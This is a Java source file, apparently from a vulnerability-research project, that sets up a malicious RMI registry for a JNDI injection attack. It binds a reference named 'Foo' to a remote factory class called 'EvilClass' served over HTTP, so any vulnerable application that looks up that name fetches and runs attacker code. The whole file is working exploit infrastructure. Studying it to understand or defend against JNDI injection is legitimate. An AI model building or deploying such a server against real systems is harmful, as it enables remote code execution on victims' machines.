package org.n1es.vuln.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ServerExp {

	public static void main(String args[]) {

		try {
			Registry registry = LocateRegistry.createRegistry(1099);

			String           factoryUrl = "http://localhost:1098/";
			Reference        reference  = new Reference("EvilClass", "EvilClass", factoryUrl);
			ReferenceWrapper wrapper    = new ReferenceWrapper(reference);
			registry.bind("Foo", wrapper);

			System.err.println("Server ready, factoryUrl:" + factoryUrl);
		} catch (Exception e) {
			System.err.println("Server exception: " + e.toString());
			e.printStackTrace();
		}
	}
}
